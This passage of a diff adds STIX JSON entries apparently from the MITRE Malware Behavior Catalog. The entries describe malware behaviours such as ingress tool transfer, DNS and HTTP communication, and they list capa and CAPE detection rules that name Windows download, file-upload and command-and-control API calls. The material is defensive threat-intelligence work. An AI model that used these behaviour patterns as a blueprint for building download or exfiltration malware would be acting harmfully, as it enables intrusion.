+                    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/webcobra-malware-uses-victims-computers-to-mine-cryptocurrency/"
+                },
+                {
+                    "source_name": "malwarebytes-kovter",
+                    "description": "\"Untangling Kovter's persistence methods,\" Malwarebytes Labs, blog, Jul. 14, 2016 [Online].",
+                    "url": "https://blog.malwarebytes.com/threat-analysis/2016/07/untangling-kovter/"
+                },
+                {
+                    "source_name": "njccic-poisonivy",
+                    "description": "\"Poison Ivy,\" NJCCIC Threat Profile, Apr. 12, 2017 [Online].",
+                    "url": "https://www.cyber.nj.gov/threat-center/threat-profiles/trojan-variants/poison-ivy"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--201961ae-2a71-41f5-bbd0-8c22bbd748de",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2019-08-01T00:00:00.000Z",
+            "modified": "2024-04-28T00:00:00.000Z",
+            "name": "Ingress Tool Transfer",
+            "obj_defn": {
+                "description": "Malware may copy files from an external system to a system on a compromised network. \n\nNote that this behavior is separate from possible execution (installation) of the file, which is covered by the **Install Additional Program ([B0023](https://github.com/MBCProject/mbc-markdown/blob/main/execution/install-additional-program.md))** behavior. \n\nSee ATT&CK: **Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))**.",
+                "external_id": "E1105",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/command-and-control/ingress-tool-transfer.md"
+            },
+            "objective_refs": [
+                "malware-objective--6b7a98eb-cb9c-4cf1-aad6-714d64000dd3",
+                "malware-objective--91583649-6a8a-48d9-a42a-75a928d4b241",
+                "malware-objective--b0d7b24c-db02-461a-a9c9-bcf790572114"
+            ],
+            "detection_rules": [
+                {
+                    "rule_name": "suspicious_mpcmdrun_use",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/windows_utilities.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "URLDownloadToFileW",
+                        "HttpOpenRequestW",
+                        "send",
+                        "InternetCrackUrlW",
+                        "InternetCrackUrlA",
+                        "WSASend",
+                        "URLDownloadToCacheFileW"
+                    ],
+                    "rule_name": "network_document_file",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_payload_download.py"
+                }
+            ],
+            "obj_version": "2.2",
+            "related_object_refs": [
+                "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add"
+            ],
+            "external_references": [
+                {
+                    "source_name": "kujawa",
+                    "description": "A. Kujawa, \"You dirty RAT! Part 1: DarkComet,\" Malwarebytes Labs, blog, Jun. 9, 2012 [Online].",
+                    "url": "https://blog.malwarebytes.com/threat-analysis/2012/06/you-dirty-rat-part-1-darkcomet/"
+                },
+                {
+                    "source_name": "roccia-shamoon",
+                    "description": "R. Roccia, \"Shamoon Attackers Employ New Tool Kit to Wipe Infected Systems,\" McAfee, blog, Dec. 19, 2018 [Online].",
+                    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-systems/"
+                },
+                {
+                    "source_name": "levene-cozycar",
+                    "description": "B. Levene, R. Falcone, and R. Wartell, \"Tracking MiniDionis: CozyCar's New Ride Is Related to Seaduke,\" Unit 42 by Palo Alto Networks, Jul 14, 2015 [Online].",
+                    "url": "https://unit42.paloaltonetworks.com/tracking-minidionis-cozycars-new-ride-is-related-to-seaduke"
+                },
+                {
+                    "source_name": "kujawa",
+                    "description": "A. Kujawa, \"You dirty RAT! Part 1: DarkComet,\" Malwarebytes Labs, blog, Jun. 9, 2012 [Online].",
+                    "url": "https://blog.malwarebytes.com/threat-analysis/2012/06/you-dirty-rat-part-1-darkcomet/"
+                },
+                {
+                    "source_name": "roccia-shamoon",
+                    "description": "R. Roccia, \"Shamoon Attackers Employ New Tool Kit to Wipe Infected Systems,\" McAfee, blog, Dec. 19, 2018 [Online].",
+                    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-systems/"
+                },
+                {
+                    "source_name": "levene-cozycar",
+                    "description": "B. Levene, R. Falcone, and R. Wartell, \"Tracking MiniDionis: CozyCar's New Ride Is Related to Seaduke,\" Unit 42 by Palo Alto Networks, Jul 14, 2015 [Online].",
+                    "url": "https://unit42.paloaltonetworks.com/tracking-minidionis-cozycars-new-ride-is-related-to-seaduke"
+                },
+                {
+                    "source_name": "sonicwall",
+                    "description": "\"Revisiting Vobfus Worm,\" SonicWALL, Mar. 8, 2013 [Online].",
+                    "url": "https://securitynews.sonicwall.com/xmlpost/revisiting-vobfus-worm-mar-8-2013/"
+                },
+                {
+                    "source_name": "cisa-ar21-039b",
+                    "description": "\"MAR-10320115-1.v1 - TEARDROP,\" CISA, Cybersecurity Advisories, Alert Code AR21-039B, Apr. 15, 2021 [Online].",
+                    "url": "https://www.cisa.gov/uscert/ncas/analysis-reports/ar21-039b"
+                },
+                {
+                    "source_name": "dong-matanbuchus",
+                    "description": "C. Dong, \"MATANBUCHUS: Another Loader as a Service Malware,\" Offset Training Solutions, blog, Feb. 15, 2022 [Online].",
+                    "url": "https://www.0ffset.net/reverse-engineering/matanbuchus-loader-analysis/"
+                },
+                {
+                    "source_name": "cohen-matabuchus",
+                    "description": "B. Cohen, \"Inside Matanbuchus: A Quirky Loader,\" CyberArk, blog, Jul. 26, 2022 [Online].",
+                    "url": "https://www.cyberark.com/resources/threat-research-blog/inside-matanbuchus-a-quirky-loader"
+                },
+                {
+                    "source_name": "hromcov\u00e1",
+                    "description": "Z. Hromcov\u00e1, \"Malicious campaign targets South Korean users with backdoor\u2011laced torrents,\" We Live Security, ESET, Jul. 8, 2019 [Online].",
+                    "url": "https://www.welivesecurity.com/2019/07/08/south-korean-users-backdoor-torrents/"
+                },
+                {
+                    "source_name": "mendrez",
+                    "description": "R. Mendrez, \"Gamut Spambot Analysis,\" Trustwave, blog, Mar. 4, 2014 [Online].",
+                    "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/gamut-spambot-analysis/"
+                },
+                {
+                    "source_name": "citizen lab",
+                    "description": "M. Brooks, J. Dalek, and M. Crete-Nishihata, \"Between Hong Kong and Burma: Tracking UP007 and SLServer Espionage Campaigns,\" The Citizen Lab, Apr. 18, 2016 [Online].",
+                    "url": "https://docs.microsoft.com/en-us/windows/win32/winmsg/about-hooks?redirectedfrom=MSDN#hook-procedures"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--7cb5847c-f662-4260-bd44-857ffd4975da",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2020-08-14T00:00:00.000Z",
+            "modified": "2023-12-05T00:00:00.000Z",
+            "name": "Create File",
+            "obj_defn": {
+                "description": "Malware creates a file.",
+                "external_id": "C0016",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/micro-behaviors/file-system/create-file.md"
+            },
+            "objective_refs": [
+                "malware-objective--b535116e-3bd9-42f6-9615-68f24c7b42ed"
+            ],
+            "obj_version": "2.1",
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--a28f7a00-c512-4a1e-88a9-9eeeca8a162a",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2020-08-14T00:00:00.000Z",
+            "modified": "2024-04-29T00:00:00.000Z",
+            "name": "DNS Communication",
+            "obj_defn": {
+                "description": "The DNS Communication micro-behavior focuses on DNS communication.",
+                "external_id": "C0011",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/micro-behaviors/communication/dns-communication.md"
+            },
+            "objective_refs": [
+                "malware-objective--5823a1fb-61cd-4484-abfc-adfa88cca816"
+            ],
+            "detection_rules": [
+                {
+                    "detect_ref": "malware-method--8d2f6d63-16d3-4b1e-9a5c-2ea3cede8a96",
+                    "rule_name": "reference DNS over HTTPS endpoints",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/dns/reference-dns-over-https-endpoints.yml"
+                },
+                {
+                    "api_fncs": [
+                        "ws2_32.gethostbyname",
+                        "DnsQuery_A",
+                        "DnsQuery_W",
+                        "DnsQuery_UTF8",
+                        "DnsQueryEx",
+                        "GetAddrInfo",
+                        "GetAddrInfoW",
+                        "GetAddrInfoEx",
+                        "gethostbyname",
+                        "getaddrinfo",
+                        "getnameinfo",
+                        "gethostent",
+                        "System.Net.Dns::GetHostAddresses"
+                    ],
+                    "detect_ref": "malware-method--40cb93ee-9bab-4239-a0de-0556ad4cd999",
+                    "rule_type": "capa",
+                    "rule_name": "resolve DNS",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/dns/resolve-dns.yml"
+                },
+                {
+                    "class": "NetworkDNSBlockChain",
+                    "rule_name": "network_dns_blockchain",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "api_fncs": [
+                        "DnsQueryA"
+                    ],
+                    "rule_name": "network_dns_idn",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "rule_name": "network_dns_opennic",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "rule_name": "network_dns_reverse_proxy",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "api_fncs": [
+                        "DnsQueryA"
+                    ],
+                    "rule_name": "network_dns_suspicious_querytype",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "api_fncs": [
+                        "DnsQuery_A",
+                        "DnsQuery_W"
+                    ],
+                    "rule_name": "network_dns_tunneling_request",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "rule_name": "network_dns_doh_tls",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_dns_suspicious.py"
+                },
+                {
+                    "api_fncs": [
+                        " --"
+                    ],
+                    "rule_name": "network_dga",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/network_dga.py"
+                }
+            ],
+            "obj_version": "2.2",
+            "external_references": [
+                {
+                    "source_name": "capa analysis",
+                    "description": "Analysis output, capa 4.0, analyzed at MITRE on Oct. 12, 2022.",
+                    "url": "https://github.com/mandiant/capa-rules"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--c889b142-22b2-4e82-9412-cf5528523f56",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2020-08-14T00:00:00.000Z",
+            "modified": "2024-04-30T00:00:00.000Z",
+            "name": "HTTP Communication",
+            "obj_defn": {
+                "description": "This micro-behavior is related to HTTP communication. \n\nInstead of being listed alphabetically, methods have been grouped to better faciliate labeling and mapping.",
+                "external_id": "C0002",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/micro-behaviors/communication/http-communication.md"
+            },
+            "objective_refs": [
+                "malware-objective--5823a1fb-61cd-4484-abfc-adfa88cca816"
+            ],
+            "detection_rules": [
+                {
+                    "api_fncs": [
+                        "winhttp.WinHttpQueryHeaders"
+                    ],
+                    "detect_ref": "malware-method--f497cb57-7379-4ee2-a82d-72f6af86428a",
+                    "rule_type": "capa",
+                    "rule_name": "read HTTP header",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/read-http-header.yml"
+                },
+                {
+                    "api_fncs": [
+                        "winhttp.WinHttpOpen"
+                    ],
+                    "detect_ref": "malware-method--d7c2b07a-e9e6-462f-a3c0-fd7db1bb2e4c",
+                    "rule_type": "capa",
+                    "rule_name": "initialize WinHTTP library",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/initialize-winhttp-library.yml"
+                },
+                {
+                    "api_fncs": [
+                        "ole32.CoCreateInstance"
+                    ],
+                    "detect_ref": "malware-method--bf8e63c7-87a3-4653-a12e-5435d862ca09",
+                    "rule_type": "capa",
+                    "rule_name": "initialize IWebBrowser2",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/initialize-iwebbrowser2.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.HttpQueryInfo"
+                    ],
+                    "rule_name": "get HTTP content length",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/get-http-content-length.yml"
+                },
+                {
+                    "api_fncs": [
+                        "winhttp.WinHttpAddRequestHeaders",
+                        "System.Net.WebHeaderCollection::Add"
+                    ],
+                    "detect_ref": "malware-method--b64291e4-c45a-4453-b913-65dba7268a1a",
+                    "rule_type": "capa",
+                    "rule_name": "set HTTP header",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/set-http-header.yml"
+                },
+                {
+                    "api_fncs": [
+                        "urlmon.ObtainUserAgentString"
+                    ],
+                    "rule_name": "reference HTTP User-Agent string",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/reference-http-user-agent-string.yml"
+                },
+                {
+                    "api_fncs": [
+                        "httpapi.HttpInitialize",
+                        "httpapi.HttpTerminate",
+                        "System.Net.HttpListener::Start"
+                    ],
+                    "detect_ref": "malware-method--1a300b38-c1ee-499b-9407-d5dbb6b34f8c",
+                    "rule_type": "capa",
+                    "rule_name": "start HTTP server",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/server/start-http-server.yml"
+                },
+                {
+                    "api_fncs": [
+                        "httpapi.HttpReceiveHttpRequest",
+                        "httpapi.HttpReceiveRequestEntityBody"
+                    ],
+                    "detect_ref": "malware-method--350f8e7d-a2c1-435f-a0bd-03160cc222ff",
+                    "rule_type": "capa",
+                    "rule_name": "receive HTTP request",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/server/receive-http-request.yml"
+                },
+                {
+                    "api_fncs": [
+                        "httpapi.HttpSendHttpResponse",
+                        "httpapi.HttpSendResponseEntityBody"
+                    ],
+                    "detect_ref": "malware-method--d64110a6-b465-472d-b0c7-fa3202c60a9d",
+                    "rule_type": "capa",
+                    "rule_name": "send HTTP response",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/server/send-http-response.yml"
+                },
+                {
+                    "api_fncs": [
+                        "System.Net.WebRequest::GetResponse",
+                        "winhttp.WinHttpReceiveResponse",
+                        "winhttp.WinHttpReadData",
+                        "winhttp.WinHttpQueryDataAvailable"
+                    ],
+                    "detect_ref": "malware-method--f99e6728-13ac-4d81-9566-6d800737c68b",
+                    "rule_type": "capa",
+                    "rule_name": "receive HTTP response",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/receive-http-response.yml"
+                },
+                {
+                    "api_fncs": [
+                        "System.Net.WebRequest::GetResponse",
+                        "System.Net.WebRequest::GetResponseAsync",
+                        "wininet.HttpOpenRequest",
+                        "wininet.InternetConnect",
+                        "wininet.HttpSendRequest",
+                        "wininet.HttpSendRequestEx",
+                        "winhttp.WinHttpSendRequest",
+                        "winhttp.WinHttpWriteData",
+                        "winhttp.WinHttpOpenRequest",
+                        "winhttp.WinHttpConnect"
+                    ],
+                    "detect_ref": "malware-method--c291cee5-5ea7-468a-8974-dc2624e7cbae",
+                    "rule_type": "capa",
+                    "rule_name": "send HTTP request",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/send-http-request.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.InternetReadFile",
+                        "wininet.InternetReadFileEx",
+                        "System.Net.WebClient::DownloadString",
+                        "System.Net.WebClient::DownloadStringAsync",
+                        "System.Net.WebClient::DownloadStringTaskAsync",
+                        "System.Net.WebClient::DownloadData",
+                        "System.Net.WebClient::DownloadDataAsync",
+                        "System.Net.WebClient::DownloadDataTaskAsync"
+                    ],
+                    "detect_ref": "malware-method--f99e6728-13ac-4d81-9566-6d800737c68b",
+                    "rule_type": "capa",
+                    "rule_name": "read data from Internet",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/read-data-from-internet.yml"
+                },
+                {
+                    "api_fncs": [
+                        "oleaut32.SysAllocString",
+                        "oleaut32.VariantInit"
+                    ],
+                    "detect_ref": "malware-method--f99e6728-13ac-4d81-9566-6d800737c68b",
+                    "rule_type": "capa",
+                    "rule_name": "get HTTP document via IWebBrowser2",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/get-http-document-via-iwebbrowser2.yml"
+                },
+                {
+                    "api_fncs": [
+                        "oleaut32.SysAllocString",
+                        "oleaut32.VariantInit"
+                    ],
+                    "detect_ref": "malware-method--bf8e63c7-87a3-4653-a12e-5435d862ca09",
+                    "rule_type": "capa",
+                    "rule_name": "get HTTP document via IWebBrowser2",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/get-http-document-via-iwebbrowser2.yml"
+                },
+                {
+                    "api_fncs": [
+                        "urlmon.URLDownloadToFile",
+                        "urlmon.URLDownloadToCacheFile",
+                        "urlmon.URLOpenBlockingStream",
+                        "urlmon.URLOpenPullStream",
+                        "urlmon.URLOpenStream",
+                        "System.Net.WebClient::DownloadFile",
+                        "System.Net.WebClient::DownloadFileAsync",
+                        "System.Net.WebClient::DownloadFileTaskAsync",
+                        "Microsoft.VisualBasic.Devices.Network::DownloadFile"
+                    ],
+                    "detect_ref": "malware-method--addcbbea-4e82-4816-a138-0b19ddacd043",
+                    "rule_type": "capa",
+                    "rule_name": "download URL",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/download-url.yml"
+                },
+                {
+                    "api_fncs": [
+                        "winhttp.WinHttpOpenRequest"
+                    ],
+                    "detect_ref": "malware-method--d80c5d48-e802-4732-b48a-c71b84f4703a",
+                    "rule_type": "capa",
+                    "rule_name": "prepare HTTP request",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/prepare-http-request.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.InternetOpen",
+                        "System.Net.WebRequest::Create",
+                        "System.Net.WebRequest::CreateDefault",
+                        "System.Net.WebRequest::CreateHttp",
+                        "wininet.InternetCloseHandle"
+                    ],
+                    "detect_ref": "malware-method--d80c5d48-e802-4732-b48a-c71b84f4703a",
+                    "rule_type": "capa",
+                    "rule_name": "create HTTP request",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/create-http-request.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.InternetWriteFile"
+                    ],
+                    "detect_ref": "malware-method--9d13adf5-2774-4ea2-bbb1-ba8e8e3ca7ea",
+                    "rule_type": "capa",
+                    "rule_name": "send file via HTTP",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/send-file-via-http.yml"
+                },
+                {
+                    "rule_name": "decompress HTTP response via IEncodingFilterFactory",
+                    "detect_ref": "malware-method--f99e6728-13ac-4d81-9566-6d800737c68b",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/decompress-http-response-via-iencodingfilterfactory.yml"
+                },
+                {
+                    "api_fncs": [
+                        "atoi",
+                        "wininet.HttpQueryInfo"
+                    ],
+                    "detect_ref": "malware-method--f497cb57-7379-4ee2-a82d-72f6af86428a",
+                    "rule_type": "capa",
+                    "rule_name": "check HTTP status code",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/check-http-status-code.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.HttpQueryInfo"
+                    ],
+                    "detect_ref": "malware-method--f99e6728-13ac-4d81-9566-6d800737c68b",
+                    "rule_type": "capa",
+                    "rule_name": "get HTTP response content encoding",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/get-http-response-content-encoding.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.InternetOpenUrl"
+                    ],
+                    "detect_ref": "malware-method--7d0ddef2-0802-48db-8a42-73b356ed083a",
+                    "rule_type": "capa",
+                    "rule_name": "connect to URL",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/connect-to-url.yml"
+                },
+                {
+                    "api_fncs": [
+                        "wininet.InternetConnect"
+                    ],
+                    "detect_ref": "malware-method--57c1f0f9-f551-4be2-857e-a9f168999eb1",
+                    "rule_type": "capa",
+                    "rule_name": "connect to HTTP server",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/connect-to-http-server.yml"
+                },
+                {
+                    "detect_ref": "malware-method--7f1b234a-9409-4a3a-9f4c-03e21d04770a",
+                    "rule_name": "extract HTTP body",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/communication/http/client/extract-http-body.yml"
+                },
+                {
+                    "api_fncs": [
+                        "HttpOpenRequestA",
+                        "InternetConnectA",
+                        "HttpOpenRequestW",
+                        "InternetConnectW"
+                    ],
+                    "class": "Internet_Dropper",
+                    "rule_name": "internet_dropper",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/internet_dropper.py"
+                },
+                {
+                    "rule_name": "bot_madness",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_madness.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_madness",
+                    "detect_ref": "malware-method--c291cee5-5ea7-468a-8974-dc2624e7cbae",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_madness.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_drive",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_drive.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_drive",
+                    "detect_ref": "malware-method--9d13adf5-2774-4ea2-bbb1-ba8e8e3ca7ea",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_drive.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "network_cnc_http",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/network_cnc_http.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "HttpOpenRequestA",
+                        "HttpSendRequestA"
+                    ],
+                    "rule_name": "recon_beacon",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/recon_beacon.py"
+                },
+                {
+                    "rule_name": "network_http",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/network_http.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "WinHttpConnect",
+                        "WinHttpOpenRequest"
+                    ],
+                    "rule_name": "explorer_http",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/network_explorer.py"
+                },
+                {
+                    "rule_name": "bot_drive2",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_drive2.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_drive2",
+                    "detect_ref": "malware-method--9d13adf5-2774-4ea2-bbb1-ba8e8e3ca7ea",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_drive2.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_dirtjumper",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_dirtjumper.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_dirtjumper",
+                    "detect_ref": "malware-method--9d13adf5-2774-4ea2-bbb1-ba8e8e3ca7ea",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_dirtjumper.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "bot_athenahttp",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/bot_athenahttp.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "WinHttpOpenRequest",
+                        "HttpOpenRequestW"
+                    ],
+                    "rule_name": "koadic_network_activity",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/blob/master/modules/signatures/windows/exploitation_framework_koadic.py"
+                },
+                {
+                    "api_fncs": [
+                        "HttpOpenRequestA",
+                        "HttpOpenRequestW",
+                        "InternetConnectW",
+                        "InternetOpenUrlA",
+                        "InternetConnectA",
+                        "InternetOpenUrlW",
+                        "WinHttpGetProxyForUrl"
+                    ],
+                    "rule_name": "http_request",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/http_request.py"
+                },
+                {
+                    "rule_name": "cmdline_http_link",
+                    "url": "https://github.com/CAPESandbox/community/blob/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_reversed_http_link",
+                    "url": "https://github.com/CAPESandbox/community/blob/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "InternetCrackUrlW",
+                        "InternetCrackUrlA",
+                        "URLDownloadToFileW",
+                        "HttpOpenRequestW",
+                        "InternetReadFile",
+                        "WSASend"
+                    ],
+                    "rule_name": "network_docfile_http",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/blob/master/modules/signatures/windows/network_docfile_http.py"
+                },
+                {
+                    "rule_name": "banker_zeus_url",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/all/banker_zeus_url.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "InternetOpenUrlA",
+                        "WinHttpOpenRequest"
+                    ],
+                    "rule_name": "downloads_from_filehosting",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/blob/master/modules/signatures/windows/filehostings.py"
+                },
+                {
+                    "api_fncs": [
+                        "InternetOpenW",
+                        "HttpAddRequestHeadersA",
+                        "HttpSendRequestW",
+                        "HttpOpenRequestW"
+                    ],
+                    "rule_name": "purplewave_network_activity",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/blob/master/modules/signatures/windows/infostealer_purplewave.py"
+                }
+            ],
+            "obj_version": "2.2",
+            "external_references": [
+                {
+                    "source_name": "capa analysis",
+                    "description": "Analysis output, capa 4.0, analyzed at MITRE on Oct. 12, 2022.",
+                    "url": "https://github.com/mandiant/capa-rules"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2019-11-27T14:58:00.429Z",
+            "modified": "2024-10-13T16:13:47.770Z",
+            "name": "Scheduled Task",
